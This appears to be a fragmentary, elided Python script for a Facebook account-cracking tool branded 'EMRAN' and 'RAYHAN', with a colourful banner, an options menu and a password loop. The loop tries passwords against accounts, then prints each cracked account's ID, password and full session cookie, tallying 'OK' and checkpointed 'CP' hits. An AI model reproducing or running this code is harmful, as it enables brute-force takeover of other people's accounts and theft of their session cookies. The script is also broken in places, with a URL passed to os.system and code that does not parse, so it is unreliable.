...
def ud():
    ...
    opt = input('\n   Choose option >>> ')
    if opt == '1':
        os.system('https://www.facebook.com/rayhanmahmud.ofc')
        FD()
        return None
...
\033[1;37m================= \33[32;45mEMRAN\33[0;m =====================
\033[1;32m     \033[1;33mCREATED BY\33[0;m   :  \033[1;33mEMRAN\33[0;m\033[1;32m && \033[1;33mEMRAN BHAI\33[0;m
\033[1;32m     \033[1;32mFACEBOK      : \033[1;34m EMRAN CYBER
\033[1;32m     \033[1;35mGITHUB       :  \033[1;35m EMRANTOOL
\033[1;32m     \033[1;36mTOOL STATUS  :  \033[1;36m TOOL IS FREE
\033[1;32m     \033[1;35mTEAM         :  \033[1;35m CYBER 99
\033[1;32m     \033[1;36mTOOL VIRSION :  \033[1;36m 2.3
\033[1;37m================= \33[32;45mEMRAN\33[0;m =====================
 
       \33[37;41m\t WELLCOME TO RAYHAN TOOL\33[0;m
 
\033[1;37m================== \33[32;45mRAYHAN\33[0;m ======================\n""")
loop = 0
oks = []
cps = []
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('    \033[1;32m(EMRAN-OKðŸ”¥)  ' +cid+ ' | ' +ps+    '  \n \033[1;33mCookie = \033[1;32m'+coki+  ' \n '+pro+'  \033[0;97m')
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('    \33[1;30m(EMRAN-CPðŸ¤•)  ' +cid+ ' | ' +ps+           '  \33[0;97m')
                ...
                continue
        loop+=1
        sys.stdout.write('\r     %s[EMRAN] [%s/%s]  OK:- %s  CP:- %s \r'%(H,loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
    except:
        pass
